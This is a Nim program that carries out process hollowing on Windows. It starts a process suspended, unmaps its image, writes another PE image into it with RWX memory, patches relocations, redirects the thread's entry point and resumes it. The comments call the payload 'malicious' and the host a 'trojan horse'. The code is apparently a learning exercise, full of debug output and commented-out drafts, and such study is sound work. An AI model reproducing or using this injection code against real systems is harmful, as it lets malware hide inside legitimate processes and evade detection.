import winim/inc/windef
import winim/inc/winbase
import winim/inc/imagehlp
import winim/lean
import strutils
import dynlib
import os

type
    ProcNtUnmapViewOfSection = proc (ProcessHandle: HANDLE, BaseAddress: PVOID): NTSTATUS {.stdcall.}
    BASE_RELOCATION_BLOCK* {.pure} = object
        PageAddress*: DWORD
        BlockSize*: DWORD
    PBASE_RELOCATION_BLOCK* = ptr BASE_RELOCATION_BLOCK
    BASE_RELOCATION_ENTRY* {.pure} = object
        Offset* {.bitsize:12.}: cushort
        Type* {.bitsize:4.}: cushort
    PBASE_RELOCATION_ENTRY* = ptr BASE_RELOCATION_ENTRY
    
var
    bufsize = int32(MAX_PATH)
    sourceFileName: wstring = newWString(bufsize)
    maliciousFileName: wstring
    x: int
    pi: PROCESS_INFORMATION
    si: STARTUPINFOW
    pbi: PROCESS_BASIC_INFORMATION
    dwReturnLength: DWORD
    maliciousImageDOSHeader: PIMAGE_DOS_HEADER
    pLoadedImage: ref LOADED_IMAGE
    maliciousImageNTHeaders: PIMAGE_NT_HEADERS

when isMainModule:
    # Get the path of the current executable (compiled by nim)
    x = GetModuleFileNameW(0, &sourceFileName, bufsize)
    
    if x == 0:
        echo "[!] GetModuleFileNameW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] PATH of the executable:\n\t", sourceFileName

    # Get the path of the binary "helloworld.exe" stored in the same directory
    # as the current one
    # var t = `-$` sourceFileName
    # var y = rfind(t.string, r"\")    
    # maliciousFileName = `+$` t[0..y].string & "helloworld.exe"
    maliciousFileName = `+$` r"C:\Windows\SysWOW64\calc.exe"
    
    echo "[+] PATH of the malicious file:\n\t", $ maliciousFileName

    # create suspended process from svchost.exe
    # basicallly the "trojan horse"
    x = CreateProcessW(NULL,`+$` maliciousFileName, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
    if x == 0:
        echo "[!] CreateProcessW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully created the suspended process"

    x = GetProcessId(pi.hProcess)
    if x == 0:
        echo "[!] GetProcessId failed. Error: ", GetLastError()
    else:
        echo "[+] PID: ", x

    # get the base address of the PEB
    x = NtQueryInformationProcess(pi.hProcess, 0, &pbi, cast[ULONG](sizeof(PROCESS_BASIC_INFORMATION)), &dwReturnLength)
    if x != 0:
        echo "[!] NtQueryInformationProcess failed. NTSTATUS value: ", x
        echo "\n\tValue of ReturnLength: ", dwReturnLength
        system.quit(1)
    else:
        echo "[+] PEB Base address: ", toHex(cast[ByteAddress](pbi.PebBaseAddress))
        echo "\tValue of ReturnLength: ", dwReturnLength

    # get the base address of the malicious image
    let maliciousBaseImageAddressOffset : pointer = cast[pointer](cast[ByteAddress](pbi.PebBaseAddress) + 8)

    echo "[+] Malicious image address offset: ",  toHex(cast[ByteAddress](maliciousBaseImageAddressOffset))
    
    # x = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, (SIZE_T) sizeof(PEB64), NULL)
    # if x == 0:
    #     echo "[!] ReadProcessMemory failed. Error: ", GetLastError()
    #     system.quit(1)
    # else:
    #     echo "[+] Image base address: ", toHex(cast[LONGLONG](peb.ImageBaseAddress))

    var maliciousBaseImageAddress: int
    var lpNumberOfBytesRead: SIZE_T 

    x = ReadProcessMemory(pi.hProcess, maliciousBaseImageAddressOffset, &maliciousBaseImageAddress, cast[SIZE_T](sizeof(pointer)), &lpNumberOfBytesRead)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError(), "\n\t"
        system.quit(1)
    else:
        echo "[+] ReadProcessMemory succeeded",
            "\n\tNumber of bytes copied: ", lpNumberOfBytesRead,
            "\n\tPEB Image Base Address: ", toHex(cast[int](maliciousBaseImageAddress))

    # read data from source file
    var maliciousFileHandle: HANDLE = CreateFileW(maliciousFileName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, 0)
    if maliciousFileHandle == INVALID_HANDLE_VALUE:
        echo "[!] CreateFileW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully got a handle on the malicious file: ", maliciousFileName

    var maliciousFileSize: DWORD = GetFileSize(maliciousFileHandle, NULL)
    # var maliciousFileBytesBufferAddress: pointer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maliciousFileSize)
    var maliciousFileBytesBuffer: seq[byte]
    newSeq(maliciousFileBytesBuffer, maliciousFileSize)

    # let f = open($ maliciousFileName)
    # readBytes(f, maliciousFileBytesBuffer)
    x = ReadFile(maliciousFileHandle, &maliciousFileBytesBuffer[0], maliciousFileSize, NULL, NULL)
    if x == 0:
        echo "[!] ReadFile failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully read the bytes from the malicious file",
            "\n\tSize returned from ReadFile: ", maliciousFileSize,
            "\n\tSize of the byte sequence: ", len maliciousFileBytesBuffer

    pLoadedImage = new(LOADED_IMAGE)
    maliciousImageDOSHeader = cast[PIMAGE_DOS_HEADER](addr maliciousFileBytesBuffer[0])
    maliciousImageNTHeaders = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](addr maliciousFileBytesBuffer[0]) + maliciousImageDOSHeader.e_lfanew)
    let maliciousImageSize: int = maliciousImageNTHeaders.OptionalHeader.SizeOfImage

    echo "[+] DOS Header address: ", toHex(cast[ByteAddress](addr maliciousFileBytesBuffer[0]))
    echo "[+] DOS Header structure:\n\tMagic number: ", toHex(maliciousImageDOSHeader.e_magic),
        "\n\tSize of last page: ", maliciousImageDOSHeader.e_cblp,
        "\n\tNumber of pages: ", maliciousImageDOSHeader.e_cp,
        "\n\tRelocations: ", maliciousImageDOSHeader.e_crlc,
        "\n\tSize of header in paragraphs: ", maliciousImageDOSHeader.e_cparhdr,
        "\n\tMinimum extra paragraphs needed: ", maliciousImageDOSHeader.e_minalloc,
        "\n\tMaximum extra paragraphs needed: ", maliciousImageDOSHeader.e_maxalloc,
        "\n\tInitial (relative) SS value: ", maliciousImageDOSHeader.e_ss,
        "\n\tInitial SP value: ", maliciousImageDOSHeader.e_sp,
        "\n\tChecksum: ", maliciousImageDOSHeader.e_csum,
        "\n\tInitial IP value: ", maliciousImageDOSHeader.e_ip,
        "\n\tInitial (relative) CS value: ", maliciousImageDOSHeader.e_cs,
        "\n\tFile address of relocation table: ", maliciousImageDOSHeader.e_lfarlc,
        "\n\tOverlay number: ", maliciousImageDOSHeader.e_ovno,
        "\n\tReserved words: ", maliciousImageDOSHeader.e_res,
        "\n\tOEM identifier (for e_oeminfo): ", maliciousImageDOSHeader.e_oemid,
        "\n\tOEM information; e_oemid specific: ", maliciousImageDOSHeader.e_oeminfo,
        "\n\tReserved words: ", maliciousImageDOSHeader.e_res2,
        "\n\tFile address of new exe header: ", maliciousImageDOSHeader.e_lfanew

    echo "[+] PE Header address: ", toHex(cast[ByteAddress](maliciousImageNTHeaders))
    echo "[+] PE Header structure:\n\tMachine: ", toHex(maliciousImageNTHeaders.FileHeader.Machine),
        "\n\tNumber of sections: ",  maliciousImageNTHeaders.FileHeader.NumberOfSections,
        "\n\tTimestamp: ",  toHex(maliciousImageNTHeaders.FileHeader.TimeDateStamp),
        "\n\tPointer to symbol table: ",  maliciousImageNTHeaders.FileHeader.PointerToSymbolTable,
        "\n\tNumber of symbols: ",  maliciousImageNTHeaders.FileHeader.NumberOfSymbols,
        "\n\tSize of optional header: ",  maliciousImageNTHeaders.FileHeader.SizeOfOptionalHeader,
        "\n\tCharacteristics: ",  maliciousImageNTHeaders.FileHeader.Characteristics,
        "\n\tImage base: ", toHex(maliciousImageNTHeaders.OptionalHeader.ImageBase)


    #[
        1. Load NTDLL library
        2. use "symAddr" (similar to GetProcAddress) to get the address of NtUnmapViewOfSection
        3. use NtUnmapViewOfSection to unmap (carve out) the destination image
    ]#
    let ntdll: LibHandle = loadLib("ntdll")
    if isNil(ntdll):
        echo "[!] Failed to load ntdll.dll"
        system.quit(1)

    let desiredFunctionAddress = ntdll.symAddr("NtUnmapViewOfSection")
    let NtUnmapViewOfSection = cast[ProcNtUnmapViewOfSection](desiredFunctionAddress)
    if isNil(NtUnmapViewOfSection):
        echo "[!] Failed to get the address of 'NtUnmapViewOfSection'"
        system.quit(1)
    else:
        echo "[+] Address of the function NtUnmapViewOfSection: ", toHex(cast[ByteAddress](desiredFunctionAddress))
    
    echo "[+] Unmapping section from address: ", toHex(cast[ByteAddress](maliciousBaseImageAddress))
    let unmapNTStatus : NTSTATUS = NtUnmapViewOfSection(pi.hProcess, cast[pointer](maliciousBaseImageAddress))
    if unmapNTStatus != 0:
        echo "[!] NtUnmapViewOfSection failed. NTSTATUS error: ", toHex(unmapNTStatus)
        system.quit(1)
    else:
        echo "[+] Unmapped the bytes from the benign process"


    # Allocate memory in the new process to make space for the malicious image
    let allocatedMemoryBaseAddress : LPVOID = VirtualAllocEx(pi.hProcess, cast[pointer](maliciousBaseImageAddress), cast[SIZE_T](maliciousImageSize), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if isNil(allocatedMemoryBaseAddress):
        echo "[!] VirtualAllocEx failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Managed to allocate memory in the benign process",
            "\n\tOld base address: ", toHex(cast[ByteAddress](maliciousBaseImageAddress)),
            "\n\tNew base address: ", toHex(cast[ByteAddress](allocatedMemoryBaseAddress)),
            "\n\tNumber of bytes allocated: ", maliciousImageSize

    let relocationDelta : int = cast[int](cast[ByteAddress](maliciousBaseImageAddress) - maliciousImageNTHeaders.OptionalHeader.ImageBase)

    echo "[+] Calculating delta"
    echo "\tSource Image Base Address: ", toHex(maliciousImageNTHeaders.OptionalHeader.ImageBase)
    echo "\tDestination Image Base Address: ", toHex(maliciousBaseImageAddress)
    echo "\tRelocation delta: ", relocationDelta

    maliciousBaseImageAddress = cast[ByteAddress](allocatedMemoryBaseAddress)

    # Change the pointer of the image in the NT headers
    maliciousImageNTHeaders.OptionalHeader.ImageBase = cast[DWORD](maliciousBaseImageAddress)

    x = WriteProcessMemory(pi.hProcess, cast[pointer](maliciousBaseImageAddress), addr maliciousFileBytesBuffer[0], maliciousImageNTHeaders.OptionalHeader.SizeOfHeaders, NULL)
    if x == 0:
        echo "[!] WriteProcessMemory failed. Error:", GetLastError()
        system.quit(1)
    else:
        echo "[+] Managed to write process memory"

    # Copy each section from the malicious image
    let sectionHeaderOffset = sizeof(IMAGE_NT_HEADERS)
    var maliciousImageSectionHeader: PIMAGE_SECTION_HEADER = cast[PIMAGE_SECTION_HEADER](cast[ByteAddress](addr maliciousFileBytesBuffer[0]) + maliciousImageDOSHeader.e_lfanew + sectionHeaderOffset)
    var maliciousImageSectionHeaderOld : PIMAGE_SECTION_HEADER = maliciousImageSectionHeader

    for i in countup(0, cast[int](maliciousImageNTHeaders.FileHeader.NumberOfSections - 1)):
        echo "[+] Copying data from the section: ", &maliciousImageSectionHeader.Name
        echo "\tSection address: ", toHex(cast[ByteAddress](maliciousImageSectionHeader))
        echo "\tPointer to raw data: ", maliciousImageSectionHeader.PointerToRawData
        echo "\tSize of raw data: ", maliciousImageSectionHeader.SizeOfRawData
        
        let benignProcessSectionAddress: pointer = cast[pointer](cast[ByteAddress](maliciousBaseImageAddress) + maliciousImageSectionHeader.VirtualAddress)
        let maliciousImageSectionBuffer: pointer = cast[pointer](cast[ByteAddress](addr maliciousFileBytesBuffer[0]) + maliciousImageSectionHeader.PointerToRawData)

        echo "[+] Writing process memory to the address: ", toHex(cast[ByteAddress](benignProcessSectionAddress))
        echo "\tSource buffer pointer: ", toHex(cast[ByteAddress](maliciousImageSectionBuffer))
        
        x = WriteProcessMemory(pi.hProcess, benignProcessSectionAddress, maliciousImageSectionBuffer, maliciousImageSectionHeader.SizeOfRawData, NULL)
        
        if x == 0:
            echo "[!] WriteProcessMemory failed. Error: ", GetLastError()
            system.quit(1)
        else:
            echo "[+] Successfully copied the section from the malicious image to the benign one"

        # calculate the address of the next section
        let sectionHeaderNextAddress: pointer = cast[pointer](cast[ByteAddress](maliciousImageSectionHeader) + sizeof(IMAGE_SECTION_HEADER))
        maliciousImageSectionHeader = cast[PIMAGE_SECTION_HEADER](sectionHeaderNextAddress)

        #[
            By the way, the operator "[]" is used for dereferencing a pointer
            type is used to get the type
            echo type(maliciousImageSectionHeader[])
            therefore, from PIMAGE_SECTION_HEADER you'll get IMAGE_SECTION_HEADER.
        ]#


    #[
        1. Get the address of the relocation table
        2. Calculate the relocation delta
        3. Relocate data
    ]#

    let relocationTable: IMAGE_DATA_DIRECTORY = maliciousImageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    

    maliciousImageSectionHeader = maliciousImageSectionHeaderOld
    maliciousImageSectionHeader = IMAGE_FIRST_SECTION(maliciousImageNTHeaders)

    for i in countup(0, cast[int](maliciousImageNTHeaders.FileHeader.NumberOfSections) - 1):
        if not (".reloc" in $ &maliciousImageSectionHeader.Name):
            echo "[+] Ignoring section: ", &maliciousImageSectionHeader.Name

            let sectionHeaderNextAddress = cast[ByteAddress](maliciousImageSectionHeader) + sizeof(IMAGE_SECTION_HEADER)
            maliciousImageSectionHeader = cast[PIMAGE_SECTION_HEADER](sectionHeaderNextAddress)
            continue

        echo "[+] Relocating section: ", &maliciousImageSectionHeader.Name
        echo "\tSection address: ", toHex(cast[int64](maliciousImageSectionHeader))

        let relocationData: DWORD = maliciousImageSectionHeader.PointerToRawData
        var offset: int = 0;
        # let relocData: IMAGE_DATA_DIRECTORY = maliciousFileNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]

        echo "[+] Size of relocation table: ", relocationTable.Size

        while offset < relocationTable.Size:
            echo "[+] Relocation offset: ", offset
            
            let relocationBlock: PBASE_RELOCATION_BLOCK = cast[PBASE_RELOCATION_BLOCK](cast[DWORD](addr maliciousFileBytesBuffer[0]) + relocationData + offset)
            echo "[+] Address of the relocation block: ", toHex(cast[ByteAddress](relocationBlock))

            # let relocationBlock2 = addr maliciousFileBytesBuffer[0]
            # echo "[+] Type of variable 'relocationBlock': ", typeof(relocationBlock)

            echo "[+] Size of a relocation block: ", sizeof(BASE_RELOCATION_BLOCK)
            offset += sizeof(BASE_RELOCATION_BLOCK)

            echo "[+] Block size of the relocation block: ", relocationBlock.BlockSize
            echo "[+] Size of BASE_RELOCATION_ENTRY: ", sizeof(BASE_RELOCATION_ENTRY)

            echo "[+] relocationEntryCount calculation: ", (relocationBlock.BlockSize - sizeof(BASE_RELOCATION_BLOCK)), " / 2"
            let relocationEntryCount = int((relocationBlock.BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / 2)
            echo "[+] Number of relocation entries: ", relocationEntryCount

            echo "[+] Calculating the pointer to relocation entries:"
            echo "\tPointer to the buffer of bytes from the malicious file: ", toHex(cast[ByteAddress](maliciousFileBytesBuffer))
            echo "\tPointer to raw data: ", relocationData
            echo "\tRelocation offset: ", offset
            let relocationEntries: PBASE_RELOCATION_ENTRY = cast[PBASE_RELOCATION_ENTRY](cast[DWORD](maliciousFileBytesBuffer) + relocationData + offset);
            echo "\tPointer to the relocation entries: ", toHex(cast[ByteAddress](relocationEntries))
            # or this:
            # var relocationEntries: PBASE_RELOCATION_ENTRY = cast[PBASE_RELOCATION_ENTRY](&buffer[relocationData + dwOffset])

            for j in countup(0, relocationEntryCount - 1):
                offset += 2

                let relocationEntryAddress = cast[ByteAddress](relocationEntries) + j * 2
                let relocationEntryObject = cast[PBASE_RELOCATION_ENTRY](relocationEntryAddress)

                if relocationEntryObject.Type == 0:
                    continue

                echo "[+] Relocation entry"
                echo "\tAddress: ", toHex(relocationEntryAddress)
                echo "\tOffset: ", relocationEntryObject.Offset
                echo "\tType: ", relocationEntryObject.Type
                # echo "[+] Relocation entry object address: ", toHex(cast[ByteAddress](relocationEntryObject))

                let fieldAddress: DWORD = relocationBlock.PageAddress + cast[DWORD](relocationEntryObject.Offset)
                var bufferRelocation: DWORD
                
                echo "[+] Base address from which to read data: ", toHex(maliciousBaseImageAddress + fieldAddress)
                x = ReadProcessMemory(pi.hProcess, cast[pointer](maliciousBaseImageAddress + fieldAddress), addr bufferRelocation, cast[SIZE_T](sizeof(DWORD)), addr lpNumberOfBytesRead)

                if x == 0:
                    echo "[+] ReadProcessMemory failed. Error: ", GetLastError()
                    system.quit(1)
                
                bufferRelocation += cast[DWORD](relocationDelta)

                x = WriteProcessMemory(pi.hProcess, cast[pointer](maliciousBaseImageAddress + fieldAddress), &bufferRelocation, cast[SIZE_T](sizeof(DWORD)), addr lpNumberOfBytesRead)

                if x == 0:
                    echo "[+] WriteProcessMemory failed. Error: ", GetLastError()
                    system.quit(1)

                

            # let pBlockheader: PBASE_RELOCATION_BLOCK = cast[PBASE_RELOCATION_BLOCK](buffer[dwRelocAddr + dwOffset])

    #         dwOffset += sizeof(BASE_RELOCATION_BLOCK)
            
    #         var dwEntryCount: DWORD = cast[DWORD]((pBlockheader.BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))

    #         var pBlocks: PBASE_RELOCATION_ENTRY = cast[PBASE_RELOCATION_ENTRY](buffer[dwRelocAddr + dwOffset])
            
    #         for k in countup(0, dwEntryCount - 1):
    #             dwOffset += sizeof(BASE_RELOCATION_ENTRY)

    #             echo "[+] Base Relocation Entry Type: ", pBlocks.Type

    #             if pBlocks.Type == 0:
    #                 let baseRelocationEntrySize = sizeof(BASE_RELOCATION_ENTRY)
    #                 let sectionHeaderOffset = 1 * baseRelocationEntrySize
    #                 let baseRelocationEntryNextAddress = cast[ByteAddress](pBlocks) + sectionHeaderOffset
    #                 pBlocks = cast[PBASE_RELOCATION_ENTRY](baseRelocationEntryNextAddress)
    #                 continue

    #             let fieldAddress: DWORD = pBlockheader.PageAddress + cast[DWORD](pBlocks.Offset)
    #             var buffer3: DWORD

    #             x = ReadProcessMemory(pi.hProcess, cast[pointer](cast[ByteAddress](peb.ImageBaseAddress) + fieldAddress), &buffer3, sizeof(DWORD), NULL)
    #             if x == 0:
    #                 echo "[!] ReadProcessMemory failed. Error: ", GetLastError()
    #                 system.quit(1)

    #             buffer3 += relocationDelta

    #             x = WriteProcessMemory(pi.hProcess, cast[pointer](cast[ByteAddress](peb.ImageBaseAddress) + fieldAddress), &buffer3, sizeof(DWORD), NULL)
    #             if x == 0:
    #                 echo "[!] WriteProcessMemory failed. Error: ", GetLastError()
    #                 system.quit(1)

    #     break

    var pContext: CONTEXT
    pContext.ContextFlags = CONTEXT_INTEGER

    x = GetThreadContext(pi.hThread, &pContext)
    if x == 0:
        echo "[!] GetThreadContext failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully retrieved the context of the new thread"

    let dwEntrypoint : DWORD = cast[DWORD](maliciousBaseImageAddress + maliciousImageNTHeaders.OptionalHeader.AddressOfEntryPoint)
    pContext.Eax = dwEntrypoint

    # WriteProcessMemory(pi.hProcess, cast[pointer](pContext.Rdx + 16), allocatedMemoryBaseAddress, 8, NULL)
    # if x == 0:
    #     echo "[!] WriteProcessMemory failed. Error: ", GetLastError()
    #     system.quit(1)

    x = SetThreadContext(pi.hThread, &pContext)
    if x == 0:
        echo "[!] SetThreadContext failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully set the thread context with the correct entry address"
        echo "[+] Entrypoint address: ", toHex(dwEntrypoint)

    x = ResumeThread(pi.hThread)
    if x == -1:
        echo "[!] SetThreadContext failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Thread resumed"

    # NtWaitForSingleObject(pi.hProcess, FALSE, NULL)
    # echo "[+] Process hollowing finished"